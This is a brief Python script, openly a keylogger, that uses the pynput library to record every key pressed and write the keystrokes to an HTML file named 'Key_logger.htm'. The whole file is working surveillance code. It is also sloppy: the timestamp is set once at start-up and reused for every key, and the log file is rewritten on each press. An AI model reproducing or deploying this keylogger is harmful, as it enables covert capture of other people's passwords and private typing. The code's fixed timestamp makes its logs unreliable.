import datetime 
import pynput 
from pynput.keyboard import Key, Listener 
keys = []
current_time=datetime.datetime.now() 
def on_press(key): 
	keys.append(key) 
	write_file(keys) 
	try: 
		alpha=(format(key.char)) 
	except AttributeError: 
		special=(format(key))
file_name='Key_logger.htm'
def write_file(keys):
    with open(file_name, 'w') as f:#you can change the extension of the according to your requirements
        for key in keys:
            k = str(key).replace("'", "")
            f.write(str(current_time))
            if 'htm' in file_name:
                    f.write('->'+k+'\n'+'<br>')#<br> is for line break after every key press
            else:
                    f.write('->'+k+'\n')
with Listener(on_press = on_press) as listener: 
	listener.join() 
